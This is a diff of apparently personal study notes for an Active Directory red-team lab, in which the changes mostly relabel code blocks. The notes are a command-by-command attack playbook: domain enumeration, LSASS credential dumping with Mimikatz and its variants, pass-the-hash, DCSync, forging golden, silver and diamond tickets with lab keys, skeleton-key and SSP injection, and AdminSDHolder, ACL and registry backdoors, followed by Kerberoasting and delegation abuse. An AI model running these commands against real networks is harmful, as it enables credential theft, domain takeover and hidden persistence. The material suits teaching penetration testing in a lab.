@@ -51,7 +51,7 @@ IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 
 ### Several ways to bypass ExecutionPolicy
 
-```
+```powershell
 powershell -ExecutionPolicy bypass
 powershell -c <cmd>
 powershell -encodedcommand
@@ -62,25 +62,25 @@ $env:PSExecutionPolicyPreference="bypass"
 
 ### Get current domain
 
-```
+```powershell
 Get-Domain
 ```
 
 ### Get object of another domain
 
-```
+```powershell
 Get-Domain -Domain moneycorp.local
 ```
 
 ### Get domain SID for the current domain
 
-```
+```powershell
 Get-DomainSID
 ```
 
 ### Get domain policy for the current domain
 
-```
+```powershell
 Get-DomainPolicyData
 
 (Get-DomainPolicyData).systemaccess
@@ -90,26 +90,26 @@ Get-DomainPolicyData
 ### Get domain policy for another domain
 
 
-```
+```powershell
 (Get-DomainPolicyData -domain moneycorp.local).systemaccess
 
 ```
 
 ### Get domain controllers for the current domain
 
-```
+```powershell
 Get-DomainController
 ```
 
 ### Get domain controllers for another domain
 
-```
+```powershell
 Get-DomainController -Domain moneycorp.local
 ```
 
 ### Get a list of users in the current domain
 
-```
+```powershell
 Get-DomainUser
 
 Get-DomainUser -Identity student1
@@ -117,7 +117,7 @@ Get-DomainUser -Identity student1
 
 ### Get list of all properties for users in the current domain
 
-```
+```powershell
 Get-DomainUser -Identity student1 -Properties *
 
 Get-DomainUser -Properties samaccountname,logonCount
@@ -125,13 +125,13 @@ Get-DomainUser -Properties samaccountname,logonCount
 
 ### Search for a particular string in a user's attributes:
 
-```
+```powershell
 Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
 ```
 
 ### Get a list of computers in the current domain
 
-```
+```powershell
 Get-DomainComputer | select Name
 
 Get-DomainComputer -OperatingSystem "*Server 2022*"
@@ -141,7 +141,7 @@ Get-DomainComputer -Ping
 
 ### Get all the groups in the current domain
 
-```
+```powershell
 Get-DomainGroup | select Name
 
 Get-DomainGroup -Domain <targetdomain>
@@ -149,61 +149,61 @@ Get-DomainGroup -Domain <targetdomain>
 
 ### Get all groups containing the word "admin" in group name
 
-```
+```powershell
 Get-DomainGroup *admin*
 ```
 
 ### Get all the members of the Domain Admins group
 
-```
+```powershell
 Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 ```
 
 ### Get the group membership for a user:
 
-```
+```powershell
 Get-DomainGroup -UserName "student1"
 ```
 
 ### List all the local groups on a machine (needs administrator privs on non-dc machines) :
 
-```
+```powershell
 Get-NetLocalGroup -ComputerName dcorp-dc
 ```
 
 ### Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :
 
-```
+```powershell
 Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
 ```
 
 ### Get actively logged users on a computer (needs local admin rights on the target)
 
-```
+```powershell
 Get-NetLoggedon -ComputerName dcorp-adminsrv
 ```
 
 ### Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
 
-```
+```powershell
 Get-LoggedonLocal -ComputerName dcorp-adminsrv
 ```
 
 ### Get the last logged user on a computer (needs administrative rights and remote registry on the target)
 
-```
+```powershell
 Get-LastLoggedOn -ComputerName dcorp-adminsrv
 ```
 
 ### Find shares on hosts in current domain.
 
-```
+```powershell
 Invoke-ShareFinder -Verbose
 ```
 
 ### File share where studentx has Write permissions
 
-```
+```powershell
 Import-Module C:\AD\Tools\PowerHuntShares.psm1
 
 Get-DomainComputer | select -ExpandProperty dnshostname > servers.txt
@@ -212,20 +212,20 @@ Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools
 
 ### Find sensitive files on computers in the domain
 
-```
+```powershell
 Invoke-FileFinder -Verbose
 ```
 
 ### Get all fileservers of the domain
 
-```
+```powershell
 Get-NetFileServer
 ```
 
 # Domain Enumeration - GPO
 ### Get list of GPO in current domain.
 
-```
+```powershell
 Get-DomainGPO
 
 Get-DomainGPO -ComputerIdentity dcorp-user1
@@ -233,20 +233,20 @@ Get-DomainGPO -ComputerIdentity dcorp-user1
 
 ### Get GPO(s) which use Restricted Groups or groups.xml for interesting users
 
-```
+```powershell
 Get-DomainGPOLocalGroup
 ```
 
 ### Get users which are in a local group of a machine using GPO
 
-```
+```powershell
 Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1
 ```
 
 ### Get machines where the given user is member of a specific group
 
 
-```
+```powershell
 Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
 ```
 
@@ -254,13 +254,13 @@ Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
 
 ### Get OUs in a domain
 
-```
+```powershell
 Get-DomainOU
 ```
 
 ### Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
 
-```
+```powershell
 Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}"
 ```
 
@@ -268,31 +268,31 @@ Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}"
 
 ### Get the ACLs associated with the specified object
 
-```
+```powershell
 Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
 ```
 
 ### Get the ACLs associated with the specified prefix to be used for search
 
-```
+```powershell
 Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
 ```
 
 ### We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs
 
-```
+```powershell
 (Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
 ```
 
 ### Search for interesting ACEs
 
-```
+```powershell
 Find-InterestingDomainAcl -ResolveGUIDs
 ```
 
 ### Get the ACLs associated with the specified path
 
-```
+```powershell
 Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
 ```
 
@@ -302,7 +302,7 @@ Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
 
  - Get a list of all domain trusts for the current domain
 
-```
+```powershell
 Get-DomainTrust
 
 Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
@@ -312,28 +312,28 @@ Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
 
 - Get details about the current forest
 
-```
+```powershell
 Get-Forest
 Get-Forest -Forest eurocorp.local
 ``` 
 
 - Get all domains in the current forest
 
-```
+```powershell
 Get-ForestDomain
 Get-ForestDomain -Forest eurocorp.local
 ```
 
 - Get all global catalogs for the current forest
 
-```
+```powershell
 Get-ForestGlobalCatalog
 Get-ForestGlobalCatalog -Forest eurocorp.local
 ```
 
 - Map trusts of a forest (no Forest trusts in the lab)
 
-```
+```powershell
 Get-ForestTrust
 Get-ForestTrust -Forest eurocorp.local
 ```
@@ -342,28 +342,28 @@ Get-ForestTrust -Forest eurocorp.local
 
 ### Find all machines on the current domain where the current user has local admin access
 
-```
+```powershell
 Find-LocalAdminAccess -Verbose
 ```
 
-```
+```powershell
 Find-WMILocalAdminAccess.ps1
 ```
 
-```
+```powershell
 Find-PSRemotingLocalAdminAccess.ps1
 ```
 
 ### Find computers where a domain admin (or specified user/group) has sessions:
 
-```
+```powershell
 Find-DomainUserLocation -Verbose
 Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
 ```
 
 ### Find computers where a domain admin session is available and current user has admin access
 
-```
+```powershell
 Test-AdminAccess
 
 Find-DomainUserLocation -CheckAccess
@@ -371,13 +371,13 @@ Find-DomainUserLocation -CheckAccess
 
 ### Find computers (File Servers and Distributed File servers) where a domain admin session is available.
 
-```
+```powershell
 Find-DomainUserLocation -Stealth
 ```
 
 ### List sessions on remote machines
 
-```
+```powershell
 Invoke-SessionHunter -FailSafe
 
 Get-DomainComputer | select  dnshostname > servers.txt
@@ -389,7 +389,7 @@ Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\servers.txt
 
 ## Services Issues using PowerUp
 
-```
+```powershell
 Invoke-AllChecks
 
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\USERNAME'
@@ -397,19 +397,19 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\USERNAME'
 
 - Get services with unquoted paths and a space in their name.
 
-```
+```powershell
 Get-ServiceUnquoted -Verbose
 ```
 
 - Get services where the current user can write to its binary path or change arguments to the binary
 
-```
+```powershell
 Get-ModifiableServiceFile -Verbose
 ```
 
 - Get the services whose configuration current user can modify.
 
-```
+```powershell
 Get-ModifiableService -Verbose
 ```
 
@@ -421,7 +421,7 @@ Get-ModifiableService -Verbose
 
 ### BloodHound
 
-```
+```powershell
 . C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
 
 Invoke-BloodHound -CollectionMethod All
@@ -443,36 +443,36 @@ SharpHound.exe –-steatlh
 
 ### Use below to execute commands or scriptblocks:
 
-```
+```powershell
 Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
 ```
 
 
 ### Use below to execute scripts from files
 
-```
+```powershell
 Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
 ```
 
 ### Use below to execute locally loaded function on the remote machines:
 
-```
+```powershell
 Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
 ```
 
 passing Arguments
 
-```
+```powershell
 Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
 ```
 
-```
+```powershell
 $Sess = New-PSSession -Computername Server1
 Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
 Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
 ```
 
-```
+```powershell
 winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
 ```
 
@@ -480,37 +480,37 @@ winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
 
 ### Dump credentials on a local machine using Mimikatz.
 
-```
+```powershell
 Invoke-Mimikatz -Command '"sekurlsa::evasive-keys"'
 ```
 
 ### Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
 
-```
+```powershell
 SafetyKatz.exe "sekurlsa::evasive-keys"
 ```
 
 ### Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
 
-```
+```powershell
 SharpKatz.exe --Command ekeys
 ```
 
 ### Dump credentials using Dumpert (Direct System Calls and API unhooking)
 
-```
+```powershell
 rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
 ```
 
 ### Using pypykatz (Mimikatz functionality in Python)
 
-```
+```powershell
 pypykatz.exe live lsa
 ```
 
 ### Using comsvcs.dll
 
-```
+```powershell
 tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
 ```
@@ -520,11 +520,11 @@ rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Use
 ### Over Pass the hash
 - admin elevation
 
-```
+```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'
 ```
 
-```
+```powershell
 SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
 ```
 
@@ -534,7 +534,7 @@ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly
 
 - doesn't need elevation
 
-```
+```powershell
 Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 ```
 
@@ -545,7 +545,7 @@ Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 
 ### DCSync feature for getting krbtgt hash
 
-```
+```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 
 SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
@@ -557,19 +557,19 @@ SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ### Execute mimikatz (or a variant) on DC as DA to get krbtgt hash
 
 
-```
+```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 ```
 
 ### DCSync feature for getting AES keys for krbtgt account
 
-```
+```powershell
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
 ### Run the below command to create a Golden ticket on any machine that has network connectivity with DC:
 
-```
+```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
@@ -578,13 +578,13 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:d
 
 ### Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:
 
-```
+```powershell
 C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
 ```
 
 ### Golden ticket forging command
 
-```
+```powershell
 C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 ![[Pasted image 20250126232214.png]]
@@ -596,7 +596,7 @@ C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F9284387
 
 ### Using hash of the Domain Controller computer account
 
-```
+```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
@@ -606,7 +606,7 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:d
 
 ### Forge a Silver ticket.
 
-```
+```powershell
 C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
 ```
 
@@ -615,12 +615,12 @@ C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local 
 need krbtgt AES keys
 
 - Rubeus command 
-```
+```powershell
 Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 - usage  /tgtdeleg
-```
+```powershell
 Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
@@ -628,13 +628,13 @@ Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb
 
 ### command to inject a skeleton key
 
-```
+```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
 
 - possible to access any machine with a valid username and password as "mimikatz"
 
-```
+```powershell
 Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
 ```
 
@@ -643,26 +643,26 @@ Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
 
 ### Dump DSRM password (needs DA privs)
 
-```
+```powershell
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
 ```
 
 ### Compare the Administrator hash with the Administrator
 
-```
+```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 ```
 
 Logon Behavior for the DSRM account needs to be changed
 before we can use its hash
 
-```
+```powershell
 Enter-PSSession -Computername dcorp-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 ```
 
 ### command to pass the hash
 
-```
+```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
 
 ls \\dcorp-dc\C$
@@ -673,7 +673,8 @@ ls \\dcorp-dc\C$
 ### We can use either of the ways:
 
 - Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
-```
+
+```powershell
 $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' 
 
 $packages += "mimilib" Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value 
@@ -681,7 +682,7 @@ $packages += "mimilib" Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\L
 $packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
 ```
 
-```
+```powershell
 Invoke-Mimikatz -Command '"misc::memssp"'
 ```
 
@@ -690,13 +691,13 @@ Invoke-Mimikatz -Command '"misc::memssp"'
 
 ### Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
 
-```
+```powershell
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
 ### Using ActiveDirectory Module and RACE toolkit
 
-```
+```powershell
 (https://github.com/samratashok/RACE) :
 
 Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
@@ -704,61 +705,61 @@ Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericA
 
 ### interesting permissions ResetPassword, WriteMembers) for a user to the AdminSDHolder:
 
-```
+```powershell
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
-```
+```powershell
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
 ### Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory:
 
-```
+```powershell
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 ```
 
 ### For pre-Server 2008 machines:
 
-```
+```powershell
 Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
 ```
 
 ### Check the Domain Admins permission - PowerView as normal user:
 
-```
+```powershell
 Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
 ```
 
 
 ### Abusing FullControl using PowerView:
 
-```
+```powershell
 Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
 ```
 
 ### Abusing ResetPassword using PowerView:
 
-```
+```powershell
 Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
 ```
 
 ### Persistence using ACLs - Rights Abuse
 #### Add FullControl rights:
 
-```
+```powershell
 Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
 #### Add rights for DCSync:
 
-```
+```powershell
 Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
 ### Execute DCSync:
 
-```
+```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 OR
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
@@ -766,7 +767,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 
 # Persistence using ACLs - Security Descriptors - WMI
 
-```
+```powershell
 ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit: 
 	. C:\AD\Tools\RACE-master\RACE.ps1
 
@@ -789,7 +790,7 @@ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\ci
 
 # Persistence using ACLs - Security Descriptors -
 ### PowerShell Remoting Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches
-```
+```powershell
 • On local machine for student1:
 Set-RemotePSRemoting -SamAccountName student1 -Verbose
 
@@ -802,7 +803,7 @@ Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
 
 # Persistence using ACLs - Security Descriptors - Remote Registry
 
-```
+```powershell
 
 • Using RACE or DAMP, with admin privs on remote machine
 Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
@@ -819,13 +820,13 @@ Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
 
 # Priv Esc - Kerberoast
 
-```
+```powershell
 PowerView
 
 Get-DomainUser -SPN
 ```
 
-```
+```powershell
 • Use Rubeus to list Kerberoast stats
 Rubeus.exe kerberoast /stats
 
@@ -848,7 +849,7 @@ john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes
 
 # Priv Esc - Targeted Kerberoasting - AS-REPs
 
-```
+```powershell
 • Enumerating accounts with Kerberos Preauth disabled
 
 • Using PowerView:
@@ -885,8 +886,8 @@ john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asreph
 
 # Priv Esc - Targeted Kerberoasting - Set SPN
 
-```
-• Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
+```powershell
+• Lets enumerate the permissions for RDPUsers on ACLs using PowerView:
 
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
 
@@ -911,7 +912,7 @@ john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\target
 
 # Priv Esc - Unconstrained Delegation
 
-```
+```powershell
 • Discover domain computers which have unconstrained delegation
 enabled using PowerView:
 
@@ -939,7 +940,7 @@ C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-
 
 # Priv Esc - Unconstrained Delegation - Printer Bug
 
-```
+```powershell
 • We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
 
 Rubeus.exe monitor /interval:5 /nowrap
@@ -953,8 +954,8 @@ MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.mone
 
 # Priv Esc - Unconstrained Delegation - Printer Bug
 
-```
-• Copy the base64 encoded TGT, remove extra spaces (if any) and use it
+```powershell
+• Copy the base64 encoded TGT remove extra spaces (if any) and use it
 on the student VM:
 
 Rubeus.exe ptt /tikcet:
@@ -965,10 +966,8 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 # Priv Esc - Constrained Delegation
 
-```
-• Enumerate users and computers with constrained delegation enabled
-
-• Using PowerView
+```powershell
+• Enumerate users and computers with constrained delegation enabled, Using PowerView
 
   
 
@@ -988,7 +987,7 @@ Abusing with Kekeo
 
 • Either plaintext password or NTLM hash/AES keys is required. We already have
 
-access to websvc's hash from dcorp-adminsrv
+access to websvcs hash from dcorp-adminsrv
 
 • Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
 
